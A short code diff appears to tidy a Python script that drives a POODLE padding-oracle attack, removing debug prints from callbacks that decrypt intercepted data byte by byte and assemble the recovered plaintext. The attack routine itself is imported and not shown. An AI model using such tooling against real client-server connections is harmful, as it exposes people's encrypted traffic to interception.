@@ -17,20 +17,14 @@ c_str = ""
 def poodle_result(guess, byte_index):
     global c_index, c_str
 
-    print(guess, byte_index)
-
     c_str += chr(guess)
     c_index += 1
 
     print("Value so far : " + c_str)
-
     poodle_next()
 
 def poodle_next():
     global c_index, c_key
-
-    print(c_index)
-
     attack.decrypt_byte(c_key, c_index, poodle_result)
 
 def poodle_handler(key, client_ip, server_ip):
